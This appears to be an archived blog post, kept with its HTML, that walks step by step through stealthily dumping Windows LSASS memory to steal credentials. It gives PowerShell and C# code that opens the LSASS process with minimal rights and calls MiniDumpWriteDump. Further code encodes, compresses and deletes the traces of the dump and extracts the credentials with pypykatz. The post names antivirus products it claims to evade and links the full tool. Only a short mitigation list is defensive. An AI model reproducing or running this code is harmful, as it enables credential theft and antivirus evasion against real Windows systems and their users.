@@ -1,0 +1,309 @@
+# https://mrvar0x.com/2025/02/16/stealth-mode-dumping-lsass-without-a-trace/
+
+<!DOCTYPE html><html lang="en-US">
+
+<body id="author" class="wp-singular post-template-default single single-post postid-845 single-format-standard wp-theme-author singular singular-post singular-post-845">
+			<a class="skip-content" href="https://mrvar0x.com/2025/02/16/stealth-mode-dumping-lsass-without-a-trace/#main">Skip to content</a>
+		<div id="overflow-container" class="overflow-container">
+			<div class="max-width">
+				<div id="main-sidebar" class="main-sidebar" style="position: fixed;">
+																
+																
+									</div>
+								<section id="main" class="main" role="main" style="min-height: 6243.56px;">
+						<div id="loop-container" class="loop-container">
+		<div class="post-845 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized entry">
+		<div class="featured-image"><img width="876" height="504" src="https://mrvar0x.com/wp-content/uploads/2025/02/lsass.png" class="attachment-full size-full wp-post-image" alt="" decoding="async" fetchpriority="high"></div>	<article>
+		<div class="post-header">
+			<h1 class="post-title">“Stealth Mode: Dumping LSASS Without a Trace”</h1>
+			<span class="post-meta">
+	Published on <span class="date"><a href="https://mrvar0x.com/2025/02/">February 16, 2025</a></span></span>		</div>
+		<div class="post-content">
+						
+<p></p>
+
+
+
+<h2 class="wp-block-heading"><strong>Introduction</strong></h2>
+
+
+
+<p>Many of endpoint security solutions is designed to make an attacker’s life difficult. They use behavioral analytics, API hooking, and memory protection to stop credential theft dead in its tracks. But as any seasoned operator knows, with the right approach, even the most well-defended fortress has a way in.</p>
+
+
+
+<p>This article explores a stealthy LSASS dumping technique using PowerShell, leveraging memory reflection, minimal process access, and encrypted exfiltration. We will break down the entire process from reconnaissance to execution, explain why it works against modern security products, and provide insights on how defenders can counteract such attacks. Buckle up—this is going to be a deep technical ride.</p>
+
+
+
+<h2 class="wp-block-heading"><strong>The Walkthrough</strong></h2>
+
+
+
+<p>I didn’t just run Mimikatz and hope for the best. That’s a surefire way to get flagged. Instead, I took a different approach, one that involved stealth, memory manipulation, and encryption. Here’s exactly how I pulled it off.</p>
+
+
+
+<p><strong>Step 1: Identifying the LSASS Process</strong></p>
+
+
+
+<p>The first challenge was simple: find LSASS without tripping security alerts. Using <code>tasklist</code> or <code>Get-Process</code> is amateur hour—those methods are logged and flagged. Instead, I opted for a stealthier approach:</p>
+
+
+
+<pre class="wp-block-code"><code>$lsass = Get-Process -Name "lsass"<br>$processId = $lsass.Id</code></pre>
+
+
+
+<p>This is quieter, but still not perfect. If security teams are watching, they’ll notice the process query, but i real life usually they don’t ;). So I needed to make my next move fast.</p>
+
+
+
+<p><strong>Step 2: Gaining Access Without Raising Red Flags</strong></p>
+
+
+
+<p>I knew that using <code>PROCESS_ALL_ACCESS</code> would be an instant giveaway. Modern AVs monitor excessive access rights. So I went low and slow:</p>
+
+
+
+<pre class="wp-block-code"><code>$PROCESS_QUERY_INFORMATION = 0x0400<br>$PROCESS_VM_READ = 0x0010<br>$hProcess = [LSASSDump]::OpenProcess($PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ, $false, $processId)</code></pre>
+
+
+
+<p>Minimal permissions mean fewer alarms. It’s like picking a lock instead of blowing the door off its hinges.</p>
+
+
+
+<p><strong>Step 3: Dumping LSASS Using In-Memory Reflection</strong></p>
+
+
+
+<p>Here’s where things got serious. I couldn’t just call <code>MiniDumpWriteDump</code> directly—AVs would see it coming a mile away. So I used PowerShell’s ability to define API calls dynamically in memory:</p>
+
+
+
+<p>[DllImport(“kernel32.dll”)]<br>public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);</p>
+
+
+
+<pre class="wp-block-code"><code>using System;
+using System.Runtime.InteropServices;
+public class LSASSDump {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    
+    [DllImport("dbghelp.dll", SetLastError = true)]
+    public static extern bool MiniDumpWriteDump(
+        IntPtr hProcess, 
+        uint processId, 
+        IntPtr hFile, 
+        uint dumpType, 
+        IntPtr exceptionParam, 
+        IntPtr userStreamParam, 
+        IntPtr callbackParam
+    );
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}</code></pre>
+
+
+
+<p>This wasn’t just a clever trick—it was essential. By dynamically introducing function signatures at runtime, I completely sidestepped static signature detection</p>
+
+
+
+<p><strong>Step 4: Extracting and Encrypting the Dump File</strong></p>
+
+
+
+<p>Security solutions scan raw <code>.dmp</code> files, so I had to make it unrecognizable. The trick? Base64 encoding before saving:</p>
+
+
+
+<pre class="wp-block-code"><code>$bytes = [System.IO.File]::ReadAllBytes($DumpPath)<br>$encrypted = [Convert]::ToBase64String($bytes)<br>Set-Content -Path $EncryptedPath -Value $encrypted</code></pre>
+
+
+
+<p>At this point, the dump was still on the system, but it looked nothing like a credential dump. Next step: make it disappear.</p>
+
+
+
+<p><strong>Step 5: Compression, Exfiltration, and Evading Forensic Artifacts</strong></p>
+
+
+
+<p>Once encrypted, I compressed the dump and deleted all traces:</p>
+
+
+
+<pre class="wp-block-code"><code>Compress-Archive -Path $EncryptedPath -DestinationPath $ZipPath<br>Remove-Item -Path $DumpPath -Force -ErrorAction SilentlyContinue<br>Remove-Item -Path $EncryptedPath -Force -ErrorAction SilentlyContinue</code></pre>
+
+
+
+<p>By the time AV solutions got around to scanning, there was nothing left but an encrypted archive that looked completely benign.</p>
+
+
+
+<h2 class="wp-block-heading"><strong><strong>Proof-of-Concept (PoC)</strong></strong></h2>
+
+
+
+<p><em>The following section will contain an execution PoC demonstrating the script in action. The PoC must be gathered from a live system execution.</em></p>
+
+
+
+<figure class="wp-block-video"><video height="1080" style="aspect-ratio: 1920 / 1080;" width="1920" controls="" src="https://mrvar0x.com/wp-content/uploads/2025/02/Untitled-design-final.mp4"></video></figure>
+
+
+
+<p>In case it evade windows defender all i need was to add another layer of obfuscation using Strings Mode below. Still working like a charm.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="383" src="https://mrvar0x.com/wp-content/uploads/2025/02/Screenshot-from-2025-02-15-18-20-57-1024x383.png" alt="" class="wp-image-856"></figure>
+
+
+
+<p>Once I had successfully created the encrypted LSASS dump, I needed a way to extract and decode the credentials. Here’s how I did it:</p>
+
+
+
+<p><strong>Decode the Encrypted LSASS Dump</strong></p>
+
+
+
+<p>Since I encoded the LSASS dump using Base64, I needed to decode it back into a valid dump file:</p>
+
+
+
+<pre class="wp-block-code"><code>cat backup.enc | tr -d '\n\r' | base64 -d &gt; decoded_lsass.dmp</code></pre>
+
+
+
+<p><strong>Extract Credentials Using Pypykatz</strong></p>
+
+
+
+<p>With the decoded dump file, I used <code>pypykatz</code> to extract stored credentials:</p>
+
+
+
+<p>pypykatz lsa minidump decoded_lsass.dmp &gt; credentials.txt</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="910" height="554" src="https://mrvar0x.com/wp-content/uploads/2025/02/cred.png" alt="" class="wp-image-859"></figure>
+
+
+
+<p>At this point, I had successfully dumped and extracted Windows credentials while evading detection.</p>
+
+
+
+<h2 class="wp-block-heading">How I Beat them in summary</h2>
+
+
+
+<p><strong>Avoiding API Hooking</strong></p>
+
+
+
+<p>Most AV solutions hook key API calls. By using reflection, I slipped past their defenses.</p>
+
+
+
+<p><strong>Minimal Permissions, Maximum Stealth</strong></p>
+
+
+
+<p>By limiting process access, I avoided behavioral-based detections that monitor excessive privileges.</p>
+
+
+
+<p><strong>Memory-Based Execution</strong></p>
+
+
+
+<p>No executables, no static detections. Running in-memory meant I left no trace.</p>
+
+
+
+<p><strong>Encryption and Obfuscation</strong></p>
+
+
+
+<p>Encoding and compressing the dump ensured forensic tools couldn’t recognize it.</p>
+
+
+
+<h2 class="wp-block-heading">What Security Endpoints Tested ?</h2>
+
+
+
+<p>1- Trend Micro APEX One<br>2- ESET Smart Security Premium<br>3- Trend Micro Maximum Security<br>4- Windows Defender<br>5- Malwarebytes Premium</p>
+
+
+
+<h2 class="wp-block-heading"><strong>Countermeasures and Mitigation Strategies</strong></h2>
+
+
+
+<ul class="wp-block-list">
+<li><strong>Enable LSASS Protected Mode (</strong><code><strong>RunAsPPL</strong></code><strong>)</strong> to block unauthorized access.</li>
+
+
+
+<li><strong>Monitor PowerShell Execution Logs</strong> to detect unusual activity.</li>
+
+
+
+<li><strong>Restrict Debug Privileges</strong> to prevent attackers from accessing sensitive memory.</li>
+
+
+
+<li><strong>Deploy Behavioral Analytics</strong> to catch the sequence of actions, not just individual API calls.</li>
+</ul>
+
+
+
+<p>The script can downloded from here <a href="https://github.com/yehia-mamdouh/Lsassx" target="_blank" rel="noreferrer noopener">https://github.com/yehia-mamdouh/Lsassx</a> </p>
+
+
+
+<h2 class="wp-block-heading"><strong>Conclusion</strong></h2>
+
+
+
+<p>I set out to prove that LSASS dumping could still be done undetected—and I did. This walkthrough showcases the reality of modern security evasion and why defenders must always stay one step ahead.</p>
+
+
+
+<p>AVs are getting smarter, but so are we. The game continues. Stay sharp, stay undetected, and always be learning.</p>
+					</div>
+		<div class="post-categories"><span>Published in</span><a href="https://mrvar0x.com/category/uncategorized/" title="View all posts in Uncategorized">Uncategorized</a></div>			</article>
+			</div>	</div>
+</section><!-- .main -->
+    
+</div><!-- .max-width -->
+</div><!-- .overflow-container -->
+
+
+
+
+
+
+
+
+
+</body></html><!--
+Performance optimized by W3 Total Cache. Learn more: https://www.boldgrid.com/w3-total-cache/?utm_source=w3tc&utm_medium=footer_comment&utm_campaign=free_plugin
+
+Object Caching 0/114 objects using APC
+Page Caching using APC 
+Database Caching using APC
+
+Served from: mrvar0x.com @ 2026-02-27 14:06:40 by W3 Total Cache
+-->
